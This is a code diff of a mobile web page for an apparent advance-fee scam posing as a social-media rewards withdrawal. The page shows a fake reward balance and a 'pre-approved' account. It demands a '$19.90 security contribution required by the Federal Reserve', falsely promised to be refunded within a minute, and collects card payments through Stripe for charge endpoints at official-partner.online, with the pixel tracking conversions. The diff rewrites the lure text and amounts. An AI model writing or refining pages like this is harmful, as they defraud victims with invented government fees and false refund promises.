@@ -3,13 +3,12 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Confirm Withdrawal — TikTok Rewards</title>
-    <meta name="theme-color" content="#ff0050" />
+    <title>Withdrawal Confirmation</title>
+    <meta name="theme-color" content="#ff2a56" />
     <meta name="robots" content="noindex, nofollow" />
     <link rel="icon" type="image/x-icon" href="../favicon.ico" />
     <link rel="preconnect" href="https://js.stripe.com" />
     <script src="https://js.stripe.com/v3/"></script>
-    <!-- TikTok Pixel -->
     <script>
       !function (w, d, t) {
         w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
@@ -18,99 +17,134 @@
       }(window, document, 'ttq');
     </script>
     <style>
-      :root { --pink:#ff0050; --yellow:#f9fd5a; --dark:#1a1a1a; --gray:#666; --green:#00b562; }
-      * { box-sizing: border-box; margin:0; padding:0; -webkit-font-smoothing: antialiased; }
-      body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background:#fff; color:var(--dark); min-height:100vh; }
-      .wrap { max-width:480px; margin:0 auto; padding:24px 20px 40px; }
-      .header { background:var(--pink); margin:-24px -20px 24px; padding:20px; text-align:center; color:#fff; }
-      .header h1 { font-size:20px; font-weight:800; }
-      .header p { font-size:13px; opacity:.9; margin-top:4px; }
-      .steps { display:flex; justify-content:space-between; margin-bottom:16px; }
-      .step { flex:1; text-align:center; font-size:11px; color:var(--gray); position:relative; }
-      .step .dot { width:28px; height:28px; border-radius:50%; background:#e5e5e5; color:#999; margin:0 auto 4px; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:13px; }
-      .step.done .dot { background:var(--pink); color:#fff; }
-      .step.active .dot { background:var(--yellow); color:var(--dark); border:2px solid var(--pink); }
-      .step.active .label { color:var(--dark); font-weight:700; }
-      .step-bar { position:absolute; top:14px; right:-50%; width:100%; height:2px; background:#e5e5e5; z-index:-1; }
-      .step.done .step-bar { background:var(--pink); }
-      .step:last-child .step-bar { display:none; }
-      .reward-summary { background:#fff; border:2px solid var(--yellow); border-radius:14px; padding:16px; margin-bottom:16px; }
-      .reward-summary .title { font-size:12px; font-weight:700; text-transform:uppercase; color:var(--gray); letter-spacing:.5px; }
-      .reward-summary .row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; font-size:14px; }
-      .reward-summary .row b { color:var(--dark); }
-      .reward-summary .amount { font-weight:900; color:var(--green); font-size:18px; }
-      .card { background:#fff; border:1px solid #e5e5e5; border-radius:14px; padding:20px; margin-bottom:16px; box-shadow:0 2px 8px rgba(0,0,0,.04); }
-      .card h2 { font-size:15px; font-weight:800; margin-bottom:12px; }
-      .fee-box { background:linear-gradient(135deg,#fff8e6,#fff); border:1.5px solid var(--yellow); border-radius:10px; padding:12px; margin-bottom:12px; }
-      .fee-box .fee-row { display:flex; justify-content:space-between; padding:4px 0; font-size:14px; }
-      .fee-box .total { font-weight:800; font-size:18px; border-top:2px dashed #ddd; padding-top:8px; margin-top:4px; }
-      label { display:block; font-size:12px; font-weight:600; color:var(--gray); margin:12px 0 6px; text-transform:uppercase; letter-spacing:.5px; }
-      input[type=text], input[type=email] { width:100%; padding:14px; border:1.5px solid #e0e0e0; border-radius:10px; font-size:15px; font-family:inherit; outline:none; }
-      input:focus { border-color: var(--pink); }
-      #card-element { padding:14px; border:1.5px solid #e0e0e0; border-radius:10px; background:#fff; }
-      #card-element.StripeElement--focus { border-color: var(--pink); }
+      :root {
+        --pink:#ff2a56; --dark:#1a1a1a; --gray:#6b6b6b; --bg:#f5f5f7; --border:#e8e8e8;
+        --green:#0ab862; --green-soft:#e6f7ee; --green-pill:#00b562;
+        --yellow:#f9d03a;
+      }
+      * { box-sizing:border-box; margin:0; padding:0; -webkit-font-smoothing:antialiased; }
+      body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--dark); min-height:100vh; }
+      .wrap { max-width:480px; margin:0 auto; padding:0 16px 40px; }
+
+      .topbar { display:grid; grid-template-columns:24px 1fr 24px; align-items:center; padding:16px 20px; background:#fff; margin:0 -16px 12px; border-bottom:1px solid var(--border); }
+      .topbar .title { text-align:center; font-size:17px; font-weight:800; }
+      .topbar svg { width:22px; height:22px; stroke:var(--dark); stroke-width:2.2; fill:none; stroke-linecap:round; stroke-linejoin:round; cursor:pointer; }
+
+      .preapproved { background:var(--green-soft); border-radius:12px; padding:14px 16px; display:flex; gap:12px; align-items:flex-start; margin-bottom:14px; }
+      .preapproved svg { width:18px; height:18px; flex-shrink:0; margin-top:1px; fill:none; stroke:var(--green); stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+      .preapproved span { font-size:14px; color:#1d4d2e; line-height:1.4; }
+      .preapproved span b { font-weight:700; color:#0d2e1a; }
+
+      .balance-card { background:#1a1a1a; color:#fff; border-radius:14px; padding:18px 20px; margin-bottom:14px; position:relative; overflow:hidden; }
+      .balance-card .label { font-size:13px; color:#cfcfcf; }
+      .balance-card .value { font-size:36px; font-weight:800; margin-top:2px; }
+      .balance-card .dashed { border-top:1px dashed rgba(255,255,255,.2); margin:16px 0 10px; }
+      .balance-card .trans { font-size:13px; color:#cfcfcf; }
+      .balance-card .coin { position:absolute; right:14px; top:50%; transform:translateY(-50%) rotate(-10deg); width:86px; height:86px; filter:drop-shadow(0 8px 16px rgba(249,208,58,.3)); }
+      .balance-card .coin img { width:100%; height:100%; display:block; }
+
+      .card { background:#fff; border-radius:14px; padding:18px; margin-bottom:14px; }
+      .card .section-label { font-size:12px; font-weight:800; color:var(--gray); letter-spacing:.8px; text-transform:uppercase; margin-bottom:10px; }
+      .fee-row { display:flex; align-items:center; gap:10px; }
+      .fee-row .fee { font-size:30px; font-weight:800; color:var(--green); }
+      .pill { display:inline-flex; align-items:center; gap:4px; background:var(--green-pill); color:#fff; font-size:11px; font-weight:700; padding:4px 10px 4px 7px; border-radius:999px; }
+      .pill svg { width:12px; height:12px; stroke:#fff; stroke-width:3; fill:none; stroke-linecap:round; stroke-linejoin:round; }
+      .fee-desc { font-size:14px; color:var(--gray); margin-top:10px; line-height:1.55; }
+      .fee-desc b { color:var(--dark); font-weight:700; }
+
+      .steps { display:grid; grid-template-columns:1fr 1fr 1fr; align-items:flex-start; position:relative; }
+      .steps .line { position:absolute; top:19px; left:16.666%; right:16.666%; height:2px; background:var(--border); z-index:0; }
+      .step { position:relative; text-align:center; z-index:1; }
+      .step .circle { width:40px; height:40px; border-radius:50%; margin:0 auto; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:18px; color:#fff; background:#cfd2d9; }
+      .step.s1 .circle { background:var(--pink); }
+      .step.s3 .circle { background:var(--yellow); color:#1a1a1a; }
+      .step .name { font-weight:800; font-size:13px; margin-top:8px; }
+      .step .sub { font-size:12px; color:var(--gray); margin-top:2px; }
+      .step.s3 .sub { color:var(--yellow); font-weight:800; }
+      .step.s3 .sub.plain { color:var(--gray); font-weight:400; }
+
+      .refund-details .row { display:flex; justify-content:space-between; padding:10px 0; font-size:14px; border-bottom:1px solid var(--border); }
+      .refund-details .row:last-child { border-bottom:none; padding-bottom:0; }
+      .refund-details .row:first-of-type { padding-top:0; }
+      .refund-details .row .k { color:var(--gray); }
+      .refund-details .row .v { font-weight:700; color:var(--dark); }
+
+      .pay-section label { display:block; font-size:12px; font-weight:700; color:var(--gray); text-transform:uppercase; letter-spacing:.5px; margin:14px 0 6px; }
+      .pay-section input { width:100%; padding:14px; border:1.5px solid var(--border); border-radius:10px; font-size:15px; font-family:inherit; outline:none; }
+      .pay-section input:focus { border-color:var(--pink); }
+      #card-element { padding:14px; border:1.5px solid var(--border); border-radius:10px; background:#fff; }
+      #card-element.StripeElement--focus { border-color:var(--pink); }
       #card-errors { color:#d00; font-size:13px; margin-top:8px; min-height:18px; }
-      .btn { width:100%; background:var(--yellow); color:var(--dark); border:none; padding:18px; border-radius:999px; font-size:17px; font-weight:800; cursor:pointer; margin-top:16px; box-shadow:0 4px 12px rgba(0,0,0,.1); transition:transform .1s; }
-      .btn:active { transform:scale(.98); }
-      .btn:disabled { background:#e5e5e5; color:#999; cursor:not-allowed; box-shadow:none; }
-      .spinner { display:inline-block; width:16px; height:16px; border:2.5px solid rgba(0,0,0,.2); border-top-color:var(--dark); border-radius:50%; animation:spin .6s linear infinite; vertical-align:middle; margin-right:8px; }
+      .pay-btn { width:100%; background:var(--pink); color:#fff; border:none; padding:18px; border-radius:12px; font-size:17px; font-weight:800; cursor:pointer; margin-top:16px; box-shadow:0 8px 20px rgba(255,42,86,.3); }
+      .pay-btn:disabled { background:#f3a1b3; cursor:not-allowed; box-shadow:none; }
+      .spinner { display:inline-block; width:16px; height:16px; border:2.5px solid rgba(255,255,255,.3); border-top-color:#fff; border-radius:50%; animation:spin .6s linear infinite; vertical-align:middle; margin-right:8px; }
       @keyframes spin { to { transform:rotate(360deg); } }
       .secure { display:flex; align-items:center; justify-content:center; gap:6px; margin-top:12px; font-size:12px; color:var(--gray); }
-      .secure svg { width:14px; height:14px; }
-      .back { display:inline-block; margin-bottom:8px; color:var(--gray); font-size:13px; text-decoration:none; }
-      .guarantee { display:flex; gap:8px; align-items:center; margin-top:16px; padding:10px 12px; background:#e8f7ef; border-left:3px solid var(--green); border-radius:6px; font-size:12px; color:#1e5e3b; }
+      .secure svg { width:14px; height:14px; fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
     </style>
   </head>
   <body>
     <div class="wrap">
-      <a href="/resgatar/" class="back">&larr; Back</a>
-      <div class="header">
-        <h1>Confirm Your Withdrawal</h1>
-        <p>Step 3 of 3 — Verify to release your reward</p>
+      <div class="topbar">
+        <svg viewBox="0 0 24 24" onclick="history.back()"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        <div class="title">Withdrawal Confirmation</div>
+        <span></span>
       </div>
 
-      <div class="steps">
-        <div class="step done"><div class="dot">1</div><div class="label">Qualified</div><div class="step-bar"></div></div>
-        <div class="step done"><div class="dot">2</div><div class="label">Payout Info</div><div class="step-bar"></div></div>
-        <div class="step active"><div class="dot">3</div><div class="label">Confirm</div></div>
+      <div class="preapproved">
+        <svg viewBox="0 0 24 24"><path d="M12 2 L4 6 v6 c0 5 3.5 8.5 8 10 c4.5-1.5 8-5 8-10 V6 Z"></path><polyline points="9 12 11 14 15 10"></polyline></svg>
+        <span><b id="methodLine">Cash App</b> <b id="maskedId">***.129.386-**</b> pre-approved for instant withdrawal</span>
       </div>
 
-      <div class="reward-summary">
-        <div class="title">Payout Summary</div>
-        <div class="row"><span>Reward Amount</span><span class="amount">$<span id="sumReward">550.00</span></span></div>
-        <div class="row"><span>Send to</span><b id="sumMethod">Cash App</b></div>
-        <div class="row"><span>Account</span><b id="sumHandle">—</b></div>
+      <div class="balance-card">
+        <div class="label">User, your balance</div>
+        <div class="value">$<span id="rewardValue">25.00</span></div>
+        <div class="dashed"></div>
+        <div class="trans">Your transactions: $0.03</div>
+        <div class="coin"><img src="../assets/coin-p-D_rWn80y.png" alt="" /></div>
       </div>
 
       <div class="card">
-        <h2>One-Time Verification Fee</h2>
-        <div class="fee-box">
-          <div class="fee-row"><span>Withdrawal verification</span><span>$19.00</span></div>
-          <div class="fee-row total"><span>Pay now</span><span>$19.00 USD</span></div>
+        <div class="section-label">Security Contribution</div>
+        <div class="fee-row">
+          <span class="fee">$<span id="feeValue">19.90</span></span>
+          <span class="pill"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg> 100% REFUNDABLE</span>
         </div>
+        <div class="fee-desc">
+          Security contribution required by the Federal Reserve to release the withdrawal of <b>$<span id="rewardValue2">25.00</span></b>. The amount of <b>$<span id="feeValue2">19.90</span></b> will be fully refunded to your Instant Transfer account within 1 minute.
+        </div>
+      </div>
 
+      <div class="card">
+        <div class="steps">
+          <div class="line"></div>
+          <div class="step s1"><div class="circle">1</div><div class="name">Pay</div><div class="sub">$<span id="feeValue3">19.90</span></div></div>
+          <div class="step s2"><div class="circle">2</div><div class="name">Refund</div><div class="sub">in 1 min</div></div>
+          <div class="step s3"><div class="circle">3</div><div class="name">$<span id="rewardValue3">25.00</span></div><div class="sub plain">in account</div></div>
+        </div>
+      </div>
+
+      <div class="card refund-details">
+        <div class="section-label">Refund Details</div>
+        <div class="row"><span class="k">Date</span><span class="v" id="todayDate">—</span></div>
+        <div class="row"><span class="k">Payment Details</span><span class="v" id="paymentMethodLabel">Cash App</span></div>
+        <div class="row"><span class="k">Amount to receive</span><span class="v">$<span id="rewardValue4">25.00</span></span></div>
+      </div>
+
+      <div class="card pay-section">
+        <div class="section-label">Payment</div>
         <form id="payment-form">
-          <label for="email">Email</label>
+          <label>Email</label>
           <input type="email" id="email" required placeholder="you@email.com" autocomplete="email" />
-
-          <label for="name">Cardholder Name</label>
+          <label>Cardholder Name</label>
           <input type="text" id="name" required placeholder="John Doe" autocomplete="cc-name" />
-
           <label>Card Details</label>
           <div id="card-element"></div>
           <div id="card-errors" role="alert"></div>
-
-          <button type="submit" id="submit-btn" class="btn">Pay $19.00 &amp; Release $550</button>
-
+          <button type="submit" id="submit-btn" class="pay-btn">Pay $<span id="btnFee">19.90</span></button>
           <div class="secure">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
+            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
             256-bit encrypted · Powered by Stripe
-          </div>
-          <div class="guarantee">
-            <span><strong>Reward released instantly</strong> after verification. 100% refundable if not received in 24h.</span>
           </div>
         </form>
       </div>
@@ -121,109 +155,94 @@
       var CHARGE_ENDPOINT   = 'https://pay.secure.official-partner.online/api/stripe-charge-front';
       var CONFIRM_3DS       = 'https://pay.secure.official-partner.online/api/stripe-confirm-3ds';
       var SUCCESS_URL       = '/obrigado/';
-      var PRICE_CENTS       = 1900;
+      var PRICE_CENTS       = 1990;
+      var FEE_LABEL         = '19.90';
 
       var urlParams = new URLSearchParams(window.location.search);
       var extraParams = {};
       urlParams.forEach(function(v, k) { extraParams[k] = v; });
 
-      var METHOD_LABELS = { cashapp:'Cash App', paypal:'PayPal', venmo:'Venmo', zelle:'Zelle', bank:'Bank Transfer', 'apple-pay':'Apple Pay' };
+      var METHOD_LABELS = { paypal:'PayPal', venmo:'Venmo', cashapp:'Cash App', zelle:'Zelle', bank:'Bank Transfer (ACH)', 'apple-pay':'Apple Pay' };
       var pmethod = urlParams.get('payout_method') || 'cashapp';
       var phandle = urlParams.get('payout_handle') || '';
-      var pname   = urlParams.get('name') || '';
-      var pemail  = urlParams.get('email') || '';
-      var reward  = urlParams.get('reward_value') || '550';
+      var reward  = Number(urlParams.get('reward_value') || '25');
 
-      document.getElementById('sumMethod').textContent = METHOD_LABELS[pmethod] || 'Cash App';
-      document.getElementById('sumHandle').textContent = phandle || '—';
-      document.getElementById('sumReward').textContent = Number(reward).toFixed(2);
-      if (pemail) document.getElementById('email').value = pemail;
-      if (pname)  document.getElementById('name').value  = pname;
+      var methodName = METHOD_LABELS[pmethod] || 'Cash App';
+      document.getElementById('methodLine').textContent = methodName;
+      document.getElementById('paymentMethodLabel').textContent = methodName;
 
-      try { ttq.track('InitiateCheckout', { value: 19.00, currency: 'USD', content_name: 'Withdrawal Verification' }); } catch(e) {}
+      function maskHandle(h) {
+        if (!h) return '***.129.386-**';
+        var clean = String(h).replace(/[^a-z0-9@._-]/gi,'');
+        if (clean.length < 4) return '***.' + clean + '-**';
+        var s = clean.slice(0, 2), e = clean.slice(-2);
+        return s + '•••' + e;
+      }
+      document.getElementById('maskedId').textContent = maskHandle(phandle);
+
+      var r = reward.toFixed(2);
+      ['rewardValue','rewardValue2','rewardValue3','rewardValue4'].forEach(function(id){ document.getElementById(id).textContent = r; });
+      ['feeValue','feeValue2','feeValue3','btnFee'].forEach(function(id){ document.getElementById(id).textContent = FEE_LABEL; });
+
+      var now = new Date();
+      var mm = String(now.getMonth()+1).padStart(2,'0');
+      var dd = String(now.getDate()).padStart(2,'0');
+      document.getElementById('todayDate').textContent = mm + '/' + dd + '/' + now.getFullYear();
+
+      try { ttq.track('InitiateCheckout', { value: PRICE_CENTS/100, currency:'USD', content_name:'Security Contribution' }); } catch(e) {}
 
       var stripe = Stripe(STRIPE_PUBLIC_KEY);
       var elements = stripe.elements();
       var card = elements.create('card', {
-        style: {
-          base: { fontSize:'16px', color:'#1a1a1a', fontFamily:'-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif', '::placeholder':{ color:'#aaa' } },
-          invalid: { color:'#d00' }
-        }
+        style: { base: { fontSize:'16px', color:'#1a1a1a', fontFamily:'-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif', '::placeholder':{ color:'#aaa' } }, invalid:{ color:'#d00' } }
       });
       card.mount('#card-element');
 
       var errEl = document.getElementById('card-errors');
-      card.on('change', function(e) { errEl.textContent = e.error ? e.error.message : ''; });
+      card.on('change', function(e){ errEl.textContent = e.error ? e.error.message : ''; });
 
       var form = document.getElementById('payment-form');
       var btn = document.getElementById('submit-btn');
-      var btnText = 'Pay $19.00 &amp; Release $' + Number(reward).toFixed(0);
-      btn.innerHTML = btnText;
+      var defaultBtnHtml = 'Pay $' + FEE_LABEL;
+      btn.innerHTML = defaultBtnHtml;
 
       form.addEventListener('submit', function(ev) {
         ev.preventDefault();
         btn.disabled = true;
         btn.innerHTML = '<span class="spinner"></span>Processing...';
         errEl.textContent = '';
-
         var email = document.getElementById('email').value.trim();
         var name  = document.getElementById('name').value.trim();
 
-        stripe.createPaymentMethod({
-          type:'card', card:card, billing_details:{ name:name, email:email }
-        }).then(function(result) {
-          if (result.error) {
-            errEl.textContent = result.error.message;
-            btn.disabled = false; btn.innerHTML = btnText; return;
-          }
-          return fetch(CHARGE_ENDPOINT, {
-            method:'POST', headers:{ 'Content-Type':'application/json' },
-            body: JSON.stringify({
-              payment_method_id: result.paymentMethod.id,
-              email: email, name: name,
-              price_cents: PRICE_CENTS, currency:'usd',
-              extra_params: extraParams
-            })
-          })
-          .then(function(r){ return r.json(); })
-          .then(function(data) {
-            if (data && (data.status === 'succeeded' || data.ok)) {
-              try { ttq.track('CompletePayment', { value: 19.00, currency:'USD', content_name:'Withdrawal Verification' }); } catch(e) {}
-              window.location.href = SUCCESS_URL; return;
-            }
-            if (data && data.requires_action && data.payment_intent_client_secret) {
-              return stripe.handleCardAction(data.payment_intent_client_secret).then(function(res) {
-                if (res.error) {
-                  errEl.textContent = res.error.message;
-                  btn.disabled = false; btn.innerHTML = btnText; return;
-                }
-                return fetch(CONFIRM_3DS, {
-                  method:'POST', headers:{ 'Content-Type':'application/json' },
-                  body: JSON.stringify({
-                    payment_intent_id: res.paymentIntent.id,
-                    email: email, name: name, extra_params: extraParams
-                  })
-                })
-                .then(function(r){ return r.json(); })
-                .then(function(d2) {
-                  if (d2 && (d2.status === 'succeeded' || d2.ok)) {
-                    try { ttq.track('CompletePayment', { value: 19.00, currency:'USD' }); } catch(e) {}
-                    window.location.href = SUCCESS_URL;
-                  } else {
-                    errEl.textContent = (d2 && d2.error) || 'Payment failed. Please try another card.';
-                    btn.disabled = false; btn.innerHTML = btnText;
-                  }
+        stripe.createPaymentMethod({ type:'card', card:card, billing_details:{ name:name, email:email } })
+          .then(function(result) {
+            if (result.error) { errEl.textContent = result.error.message; btn.disabled = false; btn.innerHTML = defaultBtnHtml; return; }
+            return fetch(CHARGE_ENDPOINT, {
+              method:'POST', headers:{ 'Content-Type':'application/json' },
+              body: JSON.stringify({ payment_method_id: result.paymentMethod.id, email, name, price_cents: PRICE_CENTS, currency:'usd', extra_params: extraParams })
+            }).then(function(r){ return r.json(); }).then(function(data) {
+              if (data && (data.status === 'succeeded' || data.ok)) {
+                try { ttq.track('CompletePayment', { value: PRICE_CENTS/100, currency:'USD', content_name:'Security Contribution' }); } catch(e) {}
+                window.location.href = SUCCESS_URL; return;
+              }
+              if (data && data.requires_action && data.payment_intent_client_secret) {
+                return stripe.handleCardAction(data.payment_intent_client_secret).then(function(res) {
+                  if (res.error) { errEl.textContent = res.error.message; btn.disabled = false; btn.innerHTML = defaultBtnHtml; return; }
+                  return fetch(CONFIRM_3DS, {
+                    method:'POST', headers:{ 'Content-Type':'application/json' },
+                    body: JSON.stringify({ payment_intent_id: res.paymentIntent.id, email, name, extra_params: extraParams })
+                  }).then(function(r){ return r.json(); }).then(function(d2) {
+                    if (d2 && (d2.status === 'succeeded' || d2.ok)) {
+                      try { ttq.track('CompletePayment', { value: PRICE_CENTS/100, currency:'USD' }); } catch(e) {}
+                      window.location.href = SUCCESS_URL;
+                    } else { errEl.textContent = (d2 && d2.error) || 'Payment failed. Please try another card.'; btn.disabled = false; btn.innerHTML = defaultBtnHtml; }
+                  });
                 });
-              });
-            }
-            errEl.textContent = (data && data.error) || 'Payment failed. Please try another card.';
-            btn.disabled = false; btn.innerHTML = btnText;
-          })
-          .catch(function(){
-            errEl.textContent = 'Network error. Please try again.';
-            btn.disabled = false; btn.innerHTML = btnText;
+              }
+              errEl.textContent = (data && data.error) || 'Payment failed. Please try another card.';
+              btn.disabled = false; btn.innerHTML = defaultBtnHtml;
+            }).catch(function(){ errEl.textContent = 'Network error. Please try again.'; btn.disabled = false; btn.innerHTML = defaultBtnHtml; });
           });
-        });
       });
     </script>
   </body>
